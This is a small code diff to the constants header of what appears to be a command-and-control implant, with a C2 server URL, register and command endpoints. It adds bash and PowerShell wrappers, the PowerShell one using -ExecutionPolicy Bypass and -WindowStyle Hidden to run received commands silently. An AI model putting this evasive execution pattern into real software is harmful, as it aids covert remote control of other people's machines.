@@ -2,6 +2,8 @@
 #define CONSTANTS_HH
 
 #include <string>
+#include <tuple>
+#include <unordered_map>
 
 const std::string C2_SERVER = "http://localhost:41450";
 const std::string REGISTER_URI = "/convey/register/";
@@ -9,6 +11,13 @@ const std::string CMD_URI = "/convey/cmd/";
 const std::string HASH_TYPE = "sha256sum";
 
 const int SEED_RNG_ITERATIONS = 1000000;
+
+const std::unordered_map<std::string, std::tuple<std::string, std::string>>
+    SHELL_SYNTAX_LIST({{"bash", {"exec bash -c '", "'"}},
+                       {"powershell",
+                        {"powershell -ExecutionPolicy Bypass -NoLogo "
+                         "-NonInteractive -NoProfile -WindowStyle Hidden \"",
+                         "\""}}});
 
 #ifdef WIN32
 
